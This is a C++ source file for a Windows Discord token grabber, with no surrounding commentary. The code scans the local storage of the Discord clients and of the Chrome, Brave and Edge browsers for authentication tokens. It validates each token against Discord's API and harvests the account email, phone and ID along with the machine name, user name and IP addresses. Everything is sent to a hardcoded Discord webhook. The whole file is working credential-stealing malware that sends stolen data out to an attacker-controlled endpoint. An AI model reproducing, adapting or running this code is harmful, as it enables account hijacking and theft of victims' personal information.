#include <windows.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <regex>
#include <shlobj.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <nlohmann/json.hpp>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")

namespace fs = std::filesystem;
using json = nlohmann::json;

const std::wstring WEBHOOK_URL = L"https://discord.com/api/webhooks/1573595682634465314/NW6nQ5gqBKWgBazoucAQXTKQ9oeRUakiznXDrk5DC-wDJKeRIapPkzAxuD1ea9lX6Sdb";

std::string WideToUtf8(const std::wstring& w) {
    if (w.empty()) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), s.data(), n, nullptr, nullptr);
    return s;
}

std::wstring Utf8ToWide(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), w.data(), n);
    return w;
}

std::wstring GetLocalAppData() {
    wchar_t* path = nullptr;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &path);
    std::wstring r(path);
    CoTaskMemFree(path);
    return r;
}

std::string ReadFileBinary(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    if (!f) return "";
    return std::string((std::istreambuf_iterator<char>(f)),
                        std::istreambuf_iterator<char>());
}

std::string DecryptDPAPI(const std::vector<BYTE>& data) {
    DATA_BLOB in{ (DWORD)data.size(), const_cast<BYTE*>(data.data()) };
    DATA_BLOB out{};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        return "";
    std::string r((char*)out.pbData, out.cbData);
    LocalFree(out.pbData);
    return r;
}

std::vector<std::string> ScanLevelDB(const fs::path& dbDir) {
    std::vector<std::string> toks;
    std::regex re(R"((mfa\.[\w-]{84}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,38}))");
    if (!fs::exists(dbDir)) return toks;
    for (auto& e : fs::recursive_directory_iterator(dbDir)) {
        if (!e.is_regular_file()) continue;
        auto ext = e.path().extension().string();
        if (ext != ".ldb" && ext != ".log") continue;
        std::string raw = ReadFileBinary(e.path());
        for (auto it = std::sregex_iterator(raw.begin(), raw.end(), re);
             it != std::sregex_iterator(); ++it)
            toks.push_back(it->str());
    }
    return toks;
}

std::vector<std::string> GrabDiscordTokens() {
    std::vector<std::string> all;
    std::wstring base = GetLocalAppData();
    const std::vector<std::wstring> clients = {
        L"Discord", L"discordcanary", L"discordptb", L"Lightcord",
        L"discorddevelopment",
        L"Google\\Chrome\\User Data",
        L"BraveSoftware\\Brave-Browser\\User Data",
        L"Microsoft\\Edge\\User Data"
    };
    for (auto& c : clients) {
        fs::path root = fs::path(base) / c;
        if (!fs::exists(root)) continue;
        for (auto& sub : { fs::path(L"Local Storage") / L"leveldb",
                           fs::path(L"Default") / L"Local Storage" / L"leveldb" }) {
            auto found = ScanLevelDB(root / sub);
            all.insert(all.end(), found.begin(), found.end());
        }
    }
    std::sort(all.begin(), all.end());
    all.erase(std::unique(all.begin(), all.end()), all.end());
    return all;
}

std::string GetPCName() {
    wchar_t buf[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD sz = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(buf, &sz);
    return WideToUtf8(buf);
}

std::string GetUserName() {
    wchar_t buf[256];
    DWORD sz = 256;
    GetUserNameW(buf, &sz);
    return WideToUtf8(buf);
}

std::string GetPublicIP() {
    HINTERNET s = WinHttpOpen(L"x/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!s) return "";
    HINTERNET c = WinHttpConnect(s, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET r = WinHttpOpenRequest(c, L"GET", L"/", nullptr, WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(r, nullptr);
    std::string body;
    DWORD avail = 0;
    do {
        WinHttpQueryDataAvailable(r, &avail);
        if (!avail) break;
        std::vector<char> b(avail + 1);
        DWORD rd = 0;
        WinHttpReadData(r, b.data(), avail, &rd);
        body.append(b.data(), rd);
    } while (avail > 0);
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return body;
}

std::string GetLocalIP() {
    char host[256];
    if (gethostname(host, sizeof(host)) != 0) return "";
    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    if (getaddrinfo(host, nullptr, &hints, &res) != 0) return "";
    char buf[INET_ADDRSTRLEN] = "";
    if (res) {
        auto* sa = (sockaddr_in*)res->ai_addr;
        inet_ntop(AF_INET, &sa->sin_addr, buf, sizeof(buf));
        freeaddrinfo(res);
    }
    return buf;
}

std::string DiscordGet(const std::string& token, const std::wstring& path) {
    HINTERNET s = WinHttpOpen(L"x/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET c = WinHttpConnect(s, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET r = WinHttpOpenRequest(c, L"GET", path.c_str(), nullptr, WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    std::wstring auth = L"Authorization: " + Utf8ToWide(token);
    WinHttpAddRequestHeaders(r, auth.c_str(), -1L,
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(r, nullptr);

    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(r, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);

    std::string body;
    if (status == 200) {
        DWORD avail = 0;
        do {
            WinHttpQueryDataAvailable(r, &avail);
            if (!avail) break;
            std::vector<char> b(avail + 1);
            DWORD rd = 0;
            WinHttpReadData(r, b.data(), avail, &rd);
            body.append(b.data(), rd);
        } while (avail > 0);
    }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    return body;
}

void SendWebhook(const json& payload) {
    HINTERNET s = WinHttpOpen(L"x/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET c = WinHttpConnect(s, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    std::wstring path = WEBHOOK_URL.substr(WEBHOOK_URL.find(L"/api/"));
    HINTERNET r = WinHttpOpenRequest(c, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER,
                                     WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    std::wstring hdr = L"Content-Type: application/json\r\n";
    WinHttpAddRequestHeaders(r, hdr.c_str(), -1L,
                             WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    std::string body = payload.dump();
    WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                       (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    WinHttpReceiveResponse(r, nullptr);
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
}

int main() {
    auto tokens = GrabDiscordTokens();
    if (tokens.empty()) return 1;

    json accounts = json::array();
    json emails = json::array();
    json phones = json::array();

    for (auto& t : tokens) {
        std::string raw = DiscordGet(t, L"/api/v9/users/@me");
        if (raw.empty()) continue;
        try {
            auto j = json::parse(raw);
            std::string em = j.value("email", "");
            std::string ph = j.value("phone", "");
            if (!em.empty()) emails.push_back(em);
            if (!ph.empty()) phones.push_back(ph);
            accounts.push_back({
                {"token", t},
                {"username", j.value("username","")},
                {"global_name", j.value("global_name","")},
                {"email", em},
                {"phone", ph},
                {"id", j.value("id","")},
                {"mfa", j.value("mfa_enabled", false)}
            });
        } catch (...) {}
    }

    if (accounts.empty()) return 1;

    json payload = {
        {"username", "grabber"},
        {"embeds", json::array({
            {
                {"title", "Discord Tokens Captured"},
                {"color", 0x5865F2},
                {"fields", json::array({
                    {{"name", "PC Name"}, {"value", GetPCName()}, {"inline", true}},
                    {{"name", "User"}, {"value", GetUserName()}, {"inline", true}},
                    {{"name", "Public IP"}, {"value", GetPublicIP()}, {"inline", true}},
                    {{"name", "Local IP"}, {"value", GetLocalIP()}, {"inline", true}},
                    {{"name", "Emails"}, {"value", emails.empty() ? "none" : emails.dump()}, {"inline", false}},
                    {{"name", "Phones"}, {"value", phones.empty() ? "none" : phones.dump()}, {"inline", false}},
                    {{"name", "Tokens"}, {"value", accounts.dump(2)}, {"inline", false}}
                })}
            }
        })}
    };

    SendWebhook(payload);

    std::ofstream f("tokens.json");
    f << accounts.dump(2);
    return 0;
}
